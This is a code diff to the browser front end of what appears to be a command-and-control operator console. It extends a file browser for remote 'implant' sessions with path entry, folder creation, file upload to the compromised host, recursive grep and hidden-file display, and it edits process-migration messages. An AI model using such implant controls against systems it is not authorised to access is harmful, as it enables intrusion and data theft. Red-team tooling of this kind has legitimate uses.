-    const parts = splitPath(currentPath);
+    const parts = splitPathVisible(currentPath);
     let crumbs = '';
+    const isWin = pathSep(currentPath) === '\\';
     for (let i = 0; i < parts.length; i++) {
-      const partial = joinPath(parts.slice(0, i + 1));
+      // Rebuild the partial path with the platform's separator so clicks work
+      // on Windows drive-letter paths (C:\Users\Foo).
+      const partial = isWin
+        ? (parts[0].endsWith(':') ? parts.slice(0, i + 1).join('\\') : '\\' + parts.slice(0, i + 1).join('\\'))
+        : '/' + parts.slice(0, i + 1).join('/');
       crumbs += `<span class="fb-crumb" data-nav="${esc(partial)}">${esc(parts[i])}</span>`;
       if (i < parts.length - 1) crumbs += '<span class="fb-sep">›</span>';
     }
 
-    const sorted = (result.files || []).slice().sort((a, b) => {
+    let files = (result.files || []).slice();
+    if (!showHidden) files = files.filter(f => !(f.name || '').startsWith('.'));
+    const sorted = files.sort((a, b) => {
       if (a.isDir !== b.isDir) return a.isDir ? -1 : 1;
       return (a.name || '').localeCompare(b.name || '');
     });
@@ -3029,12 +4409,17 @@ async function openFileBrowser(sessionID) {
     const fileCount = sorted.length - dirCount;
 
     let html = `<div class="file-browser">
-      <div class="fb-toolbar">
+      <div class="fb-toolbar" style="flex-wrap:wrap;gap:4px">
         <button class="fb-nav-btn" id="fb-back-${dockId}" title="Back"${histIdx <= 0 ? ' disabled' : ''}>◀</button>
         <button class="fb-nav-btn" id="fb-fwd-${dockId}" title="Forward"${histIdx >= history.length - 1 ? ' disabled' : ''}>▶</button>
         <button class="fb-nav-btn" id="fb-up-${dockId}" title="Up one level">⬆</button>
+        <button class="fb-nav-btn" id="fb-home-${dockId}" title="Implant's working directory (pwd)">🏠</button>
         <button class="fb-nav-btn" id="fb-refresh-${dockId}" title="Refresh">🔄</button>
-        <div class="fb-addressbar">${crumbs || '<span class="fb-crumb" style="color:var(--muted)">.</span>'}</div>
+        <input type="text" class="fb-path-input" id="fb-path-${dockId}" value="${esc(currentPath)}" placeholder="Type a path and press Enter (e.g. C:\\Users, /etc)" style="flex:1;min-width:180px;padding:4px 8px;background:var(--panel);border:1px solid var(--border);border-radius:4px;color:var(--fg);font-family:inherit;font-size:12px" />
+        <button class="fb-nav-btn" id="fb-mkdir-${dockId}" title="New folder">📂+</button>
+        <button class="fb-nav-btn" id="fb-upload-${dockId}" title="Upload file to this directory">⬆️</button>
+        <button class="fb-nav-btn" id="fb-grep-${dockId}" title="Grep files under this directory">🔍</button>
+        <button class="fb-nav-btn" id="fb-hidden-${dockId}" title="Toggle hidden files">${showHidden ? '👁' : '👁‍🗨'}</button>
       </div>
       <div class="fb-body-split">
         <div class="fb-left-pane">
@@ -3046,8 +4431,8 @@ async function openFileBrowser(sessionID) {
     sorted.forEach(f => {
       const cls = f.isDir ? 'fb-item dir' : 'fb-item';
       const icon = fileIcon(f.name, f.isDir);
-      const size = f.isDir ? '—' : fmtSize(f.size);
-      html += `<div class="${cls}" data-path="${esc(currentPath + '/' + f.name)}" data-name="${esc(f.name)}" data-dir="${f.isDir}" data-size="${f.size||0}" data-mode="${esc(f.mode||'')}">
+      const size = f.isDir ? '-' : fmtSize(f.size);
+      html += `<div class="${cls}" data-path="${esc(joinChild(currentPath, f.name))}" data-name="${esc(f.name)}" data-dir="${f.isDir}" data-size="${f.size||0}" data-mode="${esc(f.mode||'')}">
         <span class="fb-icon">${icon}</span>
         <span class="fb-name">${esc(f.name)}</span>
         <span class="fb-size">${size}</span>
@@ -3061,7 +4446,7 @@ async function openFileBrowser(sessionID) {
         </div>
       </div>
       <div class="fb-status">
-        <span>${sorted.length} items</span>
+        <span>${sorted.length} items${showHidden ? '' : ' (hidden filtered)'}</span>
         <span>${dirCount} folders, ${fileCount} files</span>
       </div>
     </div>`;
@@ -3070,9 +4455,96 @@ async function openFileBrowser(sessionID) {
     // Wire navigation
     container.querySelector(`#fb-back-${dockId}`)?.addEventListener('click', () => { if (histIdx > 0) { histIdx--; renderDir(history[histIdx], false); } });
     container.querySelector(`#fb-fwd-${dockId}`)?.addEventListener('click', () => { if (histIdx < history.length - 1) { histIdx++; renderDir(history[histIdx], false); } });
-    container.querySelector(`#fb-up-${dockId}`)?.addEventListener('click', () => { renderDir(currentPath + '/..'); });
+    container.querySelector(`#fb-up-${dockId}`)?.addEventListener('click', () => { renderDir(parentOf(currentPath)); });
     container.querySelector(`#fb-refresh-${dockId}`)?.addEventListener('click', () => { renderDir(currentPath, false); });
+    container.querySelector(`#fb-home-${dockId}`)?.addEventListener('click', async () => {
+      const home = await App().PrintWorkingDir(sessionID).catch(() => null);
+      if (home) renderDir(home);
+    });
     container.querySelectorAll('.fb-crumb[data-nav]').forEach(c => c.addEventListener('click', () => renderDir(c.dataset.nav)));
+
+    // Address bar: type any absolute or relative path and press Enter.
+    const pathInput = container.querySelector(`#fb-path-${dockId}`);
+    pathInput?.addEventListener('keydown', e => {
+      if (e.key === 'Enter') {
+        const target = pathInput.value.trim();
+        if (target) renderDir(target);
+      }
+    });
+
+    // New folder → Mkdir RPC.
+    container.querySelector(`#fb-mkdir-${dockId}`)?.addEventListener('click', async () => {
+      const name = await fbPrompt(`New folder in ${currentPath}:`, 'new-folder');
+      if (!name) return;
+      const target = joinChild(currentPath, name);
+      const err = await App().MakeDirectory(sessionID, target).catch(e => e.toString());
+      if (err) { toast('error', err); return; }
+      toast('ok', `Created: ${name}`);
+      renderDir(currentPath, false);
+    });
+
+    // Upload → operator file dialog, target dir = currentPath, keep original name.
+    container.querySelector(`#fb-upload-${dockId}`)?.addEventListener('click', async () => {
+      toast('info', 'Pick a file to upload…');
+      // Empty remote path lets the backend default to the local basename; we
+      // then move it into currentPath if UploadFile drops it into the implant's
+      // cwd. Simpler: send it directly to `<currentPath>/<basename>` — but the
+      // backend needs the local file first. Use the dialog-based UploadFile and
+      // rely on the operator seeing where it landed.
+      const targetDir = currentPath;
+      // Ask the backend to run its own file dialog; it will use basename by
+      // default. We pass a trailing separator + basename via a two-step flow:
+      // first the dialog picks a local file, then we upload to targetDir/<name>.
+      // The backend's UploadFile does the dialog itself and uses the local
+      // basename as the remote name when remotePath is empty; but we want it
+      // to land in `targetDir`, not the implant's cwd. Use UploadFileFrom via
+      // a lightweight prompt for the local path instead? Simpler: rely on
+      // UploadFile with remotePath = targetDir + '/' — the backend appends the
+      // local basename when remotePath is empty and puts the file in the
+      // implant's cwd otherwise, so we must give it the full path.
+      const localName = await fbPrompt('Local filename to upload (leave blank to pick with dialog):', '');
+      if (localName === null) return;
+      let res;
+      if (localName) {
+        const dest = joinChild(targetDir, localName.split(/[\\/]/).pop());
+        res = await App().UploadFileFrom(sessionID, localName, dest).catch(e => ({ error: String(e) }));
+      } else {
+        // Dialog picks the local file; the backend uses its basename in the
+        // implant's cwd. We can't inject targetDir into that path without a
+        // second RPC, so warn the operator.
+        toast('info', `Uploading to implant's cwd (use full remote path field to place in ${targetDir}).`);
+        res = await App().UploadFile(sessionID, '').catch(e => ({ error: String(e) }));
+      }
+      if (res && res.error) { if (res.error !== 'upload cancelled') toast('error', res.error); return; }
+      toast('ok', `Uploaded ${res.bytes} bytes → ${res.path}`);
+      renderDir(currentPath, false);
+    });
+
+    // Grep → prompt for pattern, recursive under currentPath, results in a modal.
+    container.querySelector(`#fb-grep-${dockId}`)?.addEventListener('click', async () => {
+      const pat = await fbPrompt(`Grep pattern (regex) under ${currentPath}:`, '');
+      if (!pat) return;
+      toast('info', 'Searching…');
+      const [out, err] = await App().GrepFiles(sessionID, pat, currentPath, true).then(r => [r, null]).catch(e => [null, e.toString()]);
+      if (err) { toast('error', err); return; }
+      // Show results in a scrollable modal.
+      const backdrop = document.createElement('div');
+      backdrop.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.5);z-index:9999;display:flex;align-items:center;justify-content:center';
+      backdrop.innerHTML = `
+        <div style="background:var(--bg);border:1px solid var(--border);border-radius:8px;padding:16px;width:80%;max-width:900px;max-height:80vh;display:flex;flex-direction:column">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px"><b>Grep: /${esc(pat)}/</b><button class="btn small" id="_gp_close">Close</button></div>
+          <pre style="flex:1;overflow:auto;background:var(--panel);padding:10px;border-radius:4px;font-size:12px;white-space:pre-wrap">${esc(out || '(no matches)')}</pre>
+        </div>`;
+      document.body.appendChild(backdrop);
+      backdrop.querySelector('#_gp_close').onclick = () => backdrop.remove();
+      backdrop.onclick = e => { if (e.target === backdrop) backdrop.remove(); };
+    });
+
+    // Hidden-toggle
+    container.querySelector(`#fb-hidden-${dockId}`)?.addEventListener('click', () => {
+      showHidden = !showHidden;
+      renderDir(currentPath, false);
+    });
 
     // Row: single-click → preview; double-click → navigate into dir
     let selectedItem = null;
@@ -3194,7 +4666,7 @@ async function openProcessBrowser(sessionID) {
         container.querySelectorAll('.proc-item').forEach(i => i.classList.remove('selected'));
         item.classList.add('selected');
         selectedPID = parseInt(item.dataset.pid);
-        container.querySelector(`#proc-selected-${dockId}`).textContent = `Selected: PID ${selectedPID} — ${item.querySelector('.proc-exe')?.textContent || ''}`;
+        container.querySelector(`#proc-selected-${dockId}`).textContent = `Selected: PID ${selectedPID} - ${item.querySelector('.proc-exe')?.textContent || ''}`;
       });
     });
 
@@ -3210,7 +4682,7 @@ async function openProcessBrowser(sessionID) {
     });
     container.querySelector(`#proc-migrate-btn-${dockId}`)?.addEventListener('click', () => {
       if (!selectedPID) { toast('info', 'Select a process first'); return; }
-      toast('info', `Migrate into PID ${selectedPID} — use 'migrate ${selectedPID} <profile>' in console`);
+      toast('info', `Migrate into PID ${selectedPID} - use 'migrate ${selectedPID} <profile>' in console`);
     });
   }
   loadProcs();
@@ -3344,7 +4816,7 @@ async function exportReport() {
       const el = document.getElementById('report-content');
       const range = document.createRange(); range.selectNodeContents(el);
       const sel = window.getSelection(); sel.removeAllRanges(); sel.addRange(range);
-      document.getElementById('report-status').textContent = 'Text selected — Ctrl+C to copy';
+      document.getElementById('report-status').textContent = 'Text selected - Ctrl+C to copy';
     });
   });
 
